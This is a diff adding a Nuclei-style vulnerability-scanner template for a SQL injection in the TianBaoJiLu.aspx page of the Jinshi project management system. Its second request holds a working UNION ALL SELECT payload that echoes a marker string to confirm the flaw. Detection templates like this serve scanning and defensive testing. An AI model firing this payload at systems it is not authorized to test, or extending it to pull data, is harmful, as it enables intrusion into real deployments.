@@ -1,0 +1,30 @@
+id: Jinshi-TianBaoJiLu-sqli
+
+info:
+  name: Jinshi-TianBaoJiLu-sqli
+  author: HuanXiong
+  severity: high
+  description: 金石工程项目管理系统 TianBaoJiLu.aspx SQL注入
+
+  tags: SQL Injection
+
+http:
+  - raw:
+    - | 
+      GET / HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+      Content-Type: application/x-www-form-urlencoded
+      Accept-Encoding: gzip 
+
+    - |
+      GET /query/shigongjihuajindu/TianBaoJiLu.aspx?id=1+UNION+ALL+SELECT+18%2C18%2C18%2C18%2CCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2882%29%2BCHAR%2888%29%2BCHAR%28110%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%2880%29%2BCHAR%2899%29%2BCHAR%2872%29%2BCHAR%2880%29%2BCHAR%2877%29%2BCHAR%2874%29%2BCHAR%2870%29%2BCHAR%28121%29%2BCHAR%28116%29%2BCHAR%2874%29%2BCHAR%2885%29%2BCHAR%2890%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%2869%29%2BCHAR%28110%29%2BCHAR%2897%29%2BCHAR%28104%29%2BCHAR%2867%29%2BCHAR%28119%29%2BCHAR%28122%29%2BCHAR%28111%29%2BCHAR%2876%29%2BCHAR%2883%29%2BCHAR%28115%29%2BCHAR%2883%29%2BCHAR%2871%29%2BCHAR%2887%29%2BCHAR%2881%29%2BCHAR%2879%29%2BCHAR%2869%29%2BCHAR%28117%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%2871%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18%2C18--+uInq HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+      Content-Type: application/x-www-form-urlencoded
+      Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        dsl:
+         - 'status_code==200 && contains_all(body,"qkvzqRXnTXPcHPMJFytJUZjkEnahCwzoLSsSGWQOEuqbGqjpzq")'
